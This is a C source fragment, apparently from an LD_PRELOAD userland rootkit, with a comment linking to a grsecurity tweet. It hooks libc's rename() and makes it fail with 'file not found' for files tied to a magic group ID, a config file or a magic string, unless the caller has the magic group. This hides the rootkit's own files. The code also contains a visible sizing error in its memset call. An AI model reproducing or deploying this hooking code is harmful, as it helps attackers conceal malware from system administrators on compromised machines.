// https://twitter.com/grsecurity/status/434876038745579520
int rename(const char *old, const char *new) {
  struct stat s_fstat;
  memset(&s_fstat, 0, sizeof(stat));
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_rename) old_rename = dlsym(libc, "rename");
  if (getgid() == MAGIC_GID) return old_rename(old,new);
  old_xstat(_STAT_VER, old, &s_fstat);

  if(s_fstat.st_gid == MAGIC_GID || !strcmp(old,CONFIG_FILE) || strstr(old,MAGIC_STRING)) {
    errno = ENOENT;
    return -1;
  }
  return old_rename(old, new);
}

